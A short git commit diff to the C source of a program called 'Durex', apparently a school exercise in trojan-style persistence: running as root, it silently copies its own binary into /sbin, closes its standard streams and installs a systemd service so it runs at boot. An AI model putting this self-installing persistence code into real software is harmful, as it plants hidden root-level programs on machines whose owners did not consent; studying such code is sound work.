2800e4592dcbc64df84d9485c75a5a8fb33bbc25
Mathieu ABOU-HAYDAR <maabou-h@e1r4p14.42.fr>
2022-01-06 13:42:07 +0100

    a

--- src/main.c
+++ src/main.c
@@ -3,18 +3,20 @@
 int		main(int ac, char **av, char **envp)
 {
 	char buf[255];
+	char buff[255];
 
 	memset(&buf, 0, 255);
 	if(geteuid() != 0)
 		return (1);
 	readlink("/proc/self/exe", buf, 255);
+	snprintf(buff, 255, "cp %s /sbin/Durex && chmod u+x /sbin/Durex", buf);
 	if (strcmp(buf, "/sbin/Durex") && strcmp(buf, "/usr/sbin/Durex"))
 	{
 		printf("maabou-h\n");
 		close(0);
 		close(1);
 		close(2);
-		if (system("cp /proc/self/exe /sbin/Durex && chmod u+x /sbin/Durex") != 0)
+		if (system(buff) != 0)
 			return (1);
 		if (system("cp ./Durex.service /etc/systemd/system/Durex.service && chmod u+x /etc/systemd/system/Durex.service") != 0)
 			return (1);
